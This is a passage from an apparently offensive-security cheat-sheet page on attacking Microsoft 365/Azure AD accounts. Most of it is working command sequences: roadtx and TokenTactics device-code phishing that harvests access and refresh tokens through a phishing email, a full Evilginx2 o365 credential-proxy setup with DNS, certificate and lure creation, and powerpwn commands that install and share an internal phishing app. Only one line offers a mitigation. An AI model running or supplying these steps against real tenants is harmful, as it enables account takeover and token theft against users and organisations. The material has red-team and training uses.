<p><strong>Mitigation</strong>: Enable <code>Do not allow user consent</code> for applications in the "Consent and permissions menu".</p>
<h3 id="roadtx">Roadtx</h3>
<ul>
<li>Use the authorization code flow in roadtx to get token
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">roadtx</span> <span class="n">codeauth</span> <span class="n">-c</span> <span class="p">&lt;</span><span class="n">app-id</span><span class="p">&gt;</span> <span class="n">-r</span> <span class="n">msgraph</span> <span class="n">-t</span> <span class="p">&lt;</span><span class="n">tenant-id</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">0</span><span class="p">.</span><span class="n">A</span><span class="p">....&gt;</span> <span class="n">-ru</span> <span class="s1">&#39;https://&lt;phish-app&gt;/redir&#39;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">app-secret</span><span class="p">&gt;</span>
</code></pre></div></li>
</ul>
<h2 id="device-code-phishing">Device Code Phishing</h2>
<ul>
<li>
<p>Using roadtool: <code>roadtx gettokens -u user@domain.lab --device-code</code>
    <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">roadtx</span><span class="p">.</span><span class="n">exe</span> <span class="n">auth</span> <span class="p">-</span><span class="n">-device-code</span> <span class="n">-c</span> <span class="n">29d9ed98-a469</span><span class="p">-</span><span class="n">4536-ade2-f981bc1d605e</span>
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">Requesting</span> <span class="n">token</span> <span class="k">for</span> <span class="n">resource</span> <span class="n">https</span><span class="p">://</span><span class="n">graph</span><span class="p">.</span><span class="n">windows</span><span class="p">.</span><span class="n">net</span>
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">To</span> <span class="n">sign</span> <span class="k">in</span><span class="p">,</span> <span class="n">use</span> <span class="n">a</span> <span class="n">web</span> <span class="n">browser</span> <span class="n">to</span> <span class="n">open</span> <span class="n">the</span> <span class="n">page</span> <span class="n">https</span><span class="p">://</span><span class="n">microsoft</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">devicelogin</span> <span class="n">and</span> <span class="n">enter</span> <span class="n">the</span> <span class="n">code</span> <span class="n">XXXXXXXXX</span> <span class="n">to</span> <span class="n">authenticate</span><span class="p">.</span>
</code></pre></div></p>
</li>
<li>
<p>Using TokenTactics to request a token for Azure Graph API using a device code
    <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">TokenTactics</span><span class="p">.</span><span class="n">psd1</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">Get-AzureToken</span> <span class="n">-Client</span> <span class="n">Graph</span>
</code></pre></div></p>
</li>
<li>Replace <code>&lt;REPLACE-WITH-DEVCODE-FROM-TOKENTACTICS&gt;</code> in the <a href="https://github.com/rvrsh3ll/TokenTactics/blob/main/resources/DeviceCodePhishingEmailTemplate.oft">phishing email</a></li>
<li>Leave TokenTactics running in the PowerShell window and send the phishing email</li>
<li>Targeted user will follow the link to https://microsoft.com/devicelogin and complete the Device Code form</li>
<li>Enjoy your <strong>access token</strong> and <strong>refresh token</strong></li>
</ul>
<h2 id="phishing-with-evilginx2">Phishing with Evilginx2</h2>
<ul>
<li>Run <a href="https://github.com/kgretzky/evilginx2">kgretzky/evilginx2</a> with o365 phishlet
    <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="n">evilginx2</span> <span class="n">-p</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">evilginx2</span><span class="p">\</span><span class="n">phishlets</span>
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="p">:</span> <span class="n">config</span> <span class="n">domain</span> <span class="n">username</span><span class="p">.</span><span class="n">corp</span>
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="p">:</span> <span class="n">config</span> <span class="n">ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="p">:</span> <span class="n">phishlets</span> <span class="n">hostname</span> <span class="n">o365</span> <span class="n">login</span><span class="p">.</span><span class="n">username</span><span class="p">.</span><span class="n">corp</span>
<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="p">:</span> <span class="n">phishlets</span> <span class="nb">get-hosts</span> <span class="n">o365</span>
</code></pre></div></li>
<li>Create a DNS entry type A for <code>login.login.username.corp</code> and <code>www.login.username.corp</code>, pointing to your machine</li>
<li>Copy certificate and enable the phishing
    <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">Copy-Item</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Username</span><span class="p">\.</span><span class="n">evilginx</span><span class="p">\</span><span class="n">crt</span><span class="p">\</span><span class="n">ca</span><span class="p">.</span><span class="n">crt</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Username</span><span class="p">\.</span><span class="n">evilginx</span><span class="p">\</span><span class="n">crt</span><span class="p">\</span><span class="n">login</span><span class="p">.</span><span class="n">username</span><span class="p">.</span><span class="n">corp</span><span class="p">\</span><span class="n">o365</span><span class="p">.</span><span class="n">crt</span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">Copy-Item</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Username</span><span class="p">\.</span><span class="n">evilginx</span><span class="p">\</span><span class="n">crt</span><span class="p">\</span><span class="n">private</span><span class="p">.</span><span class="n">key</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Username</span><span class="p">\.</span><span class="n">evilginx</span><span class="p">\</span><span class="n">crt</span><span class="p">\</span><span class="n">login</span><span class="p">.</span><span class="n">username</span><span class="p">.</span><span class="n">corp</span><span class="p">\</span><span class="n">o365</span><span class="p">.</span><span class="n">key</span>
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="p">:</span> <span class="n">phishlets</span> <span class="n">enable</span> <span class="n">o365</span>
<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="c"># get the phishing URL</span>
<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="p">:</span> <span class="n">lures</span> <span class="n">create</span> <span class="n">o365</span>
<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="p">:</span> <span class="n">lures</span> <span class="nb">get-url</span> <span class="n">0</span>
</code></pre></div></li>
</ul>
<h3 id="internal-phishing-power-platform">Internal Phishing - Power Platform</h3>
<blockquote>
<p>Set up an internal phishing application on a Microsoft-owned domains which will automatically authenticate as users browse to your link.</p>
</blockquote>
<ul>
<li>Install <a href="https://github.com/mbrg/power-pwn">mbrg/power-pwn</a> - An offensive and defensive security toolset for Microsoft 365 Power Platform
    <div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">pip</span> <span class="n">install</span> <span class="n">powerpwn</span>
</code></pre></div></li>
<li>Install the application: <code>powerpwn phishing install-app -t {tenant-id} -e {environment-id} --input {path to application package zip} -n {application name}</code></li>
<li>Share application with org: <code>powerpwn phishing share-app -t {tenant-id} -e {environment-id} -a {app id}</code></li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.alteredsecurity.com/post/introduction-to-365-stealer">Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack</a></li>
<li><a href="https://www.youtube.com/watch?v=51FSvndgddk&amp;list=WL">Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) - trouble1_raunak - Jun 6, 2021</a></li>
<li><a href="https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html">The Art of the Device Code Phish - Bobby Cooke - July 12, 2021</a></li>
<li><a href="https://www.youtube.com/watch?v=LpdckZyBwvs">Power Pwn - Black Hat Arsenal 2023 - Aug 24, 2023</a></li>
<li><a href="https://www.youtube.com/watch?v=D3A62Rzozq4">Low Code High Risk - Enterprise Domination via Low Code Abuse - Defcon 30 - Oct 20, 2022</a></li>
</ul>







  
    
  
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">January 15, 2024</span>
  </span>

    
    
    
    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "navigation.tracking", "navigation.top"], "search": "../../../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.d7c377c4.min.js"></script>
      
    
  </body>
</html>